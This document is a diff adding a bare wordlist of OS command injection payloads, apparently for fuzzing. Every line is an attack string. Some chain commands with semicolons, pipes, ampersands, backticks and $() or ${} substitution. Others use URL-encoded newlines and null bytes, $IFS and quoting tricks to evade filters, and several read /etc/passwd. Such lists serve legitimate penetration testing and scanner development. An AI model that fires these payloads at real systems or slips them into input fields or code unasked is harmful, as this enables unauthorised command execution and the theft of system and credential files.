@@ -1,0 +1,187 @@
+; ls
+;ls
+; ls;
+;ls;
+|ls
+| ls
+| ls |
+|ls|
+||ls
+|| ls
+|| ls ||
+||ls||
+&ls
+& ls
+& ls &
+&ls&
+&&ls
+&& ls
+&& ls &&
+&&ls&&
+`ls`
+` ls `
+$(ls)
+$( ls )
+${ls}
+${ ls }
+;id;
+|id|
+||id||
+&id&
+&&id&&
+`id`
+$(id)
+${id}
+%0als
+%0aid
+%0apwd
+%0awhoami
+%0dls
+%0did
+%0dpwd
+%0dwhoami
+%0a%0dls
+%0a%0did
+%0a%0dpwd
+%0a%0dwhoami
+\nls
+\rid
+\r\npwd
+\n\rwhoami
+; ls%00
+| id%00
+|| pwd%00
+& whoami%00
+%00;ls
+%00|id
+%00||pwd
+%00&whoami
+; ls%20
+| id%20
+;ls%09
+|id%09
+;%09ls
+|%09id
+; ls%0b
+| id%0b
+; ls%0c
+| id%0c
+;;ls
+|||id
+&&&whoami
+;;;ls;;;
+||||id||||
+&&&&&whoami&&&&&
+;`ls`
+|`id`
+||`pwd`
+&`whoami`
+&&`uname`
+;$(ls)
+|$(id)
+||$(pwd)
+&$(whoami)
+&&$(uname)
+;cat${IFS}/etc/passwd
+|cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+|cat$IFS/etc/passwd
+;cat$IFS$9/etc/passwd
+|cat$IFS$9/etc/passwd
+;{ls,-la}
+|{cat,/etc/passwd}
+;cat</etc/passwd
+|cat</etc/passwd
+;cat<>/etc/passwd
+|cat<>/etc/passwd
+;cat<<EOF
+|cat<<EOF
+;cat<<<$(ls)
+|cat<<<$(id)
+;ls>/tmp/out
+|id>/tmp/out
+;ls>>/tmp/out
+|id>>/tmp/out
+;ls 2>&1
+|id 2>&1
+;ls 2>/dev/null
+|id 2>/dev/null
+;ls &>/dev/null
+|id &>/dev/null
+;(ls)
+|(id)
+;((ls))
+|((id))
+;{ls}
+|{id}
+;[ls]
+|[id]
+;$((1+1));ls
+|$((2+2));id
+;!ls
+|!id
+;~ls
+|~id
+;ls#comment
+|id#comment
+;ls//comment
+|id//comment
+;ls||id
+|ls&&id
+;ls|id
+|ls;id
+;ls&id
+|ls||id
+;ls&&whoami
+|ls||whoami||pwd
+;ls;id;pwd
+|ls|id|pwd
+;ls&id&pwd
+|ls||id||pwd
+;ls&&id&&pwd
+|ls;id;pwd;whoami
+;cat /etc/passwd;
+|cat /etc/passwd|
+;cat /etc/passwd||
+|cat /etc/passwd&&
+;cat /etc/passwd&
+|cat /etc/passwd;
+$'\n'ls
+$'\r'id
+$'\t'pwd
+$'\x0a'ls
+$'\x0d'id
+;l$()s
+|i$()d
+;l${}s
+|i${}d
+;l''s
+|i''d
+;l""s
+|i""d
+;l\s
+|i\d
+;l\
+s
+|i\
+d
+;ls$@
+|id$@
+;ls$*
+|id$*
+;ls$1
+|id$2
+;ls${x}
+|id${y}
+;ls$x
+|id$y
+;ls`echo`
+|id`echo`
+;ls$(echo)
+|id$(echo)
+;ls;exit
+|id;exit
+;ls||exit
+|id&&exit
+;ls&exit
+|id|exit
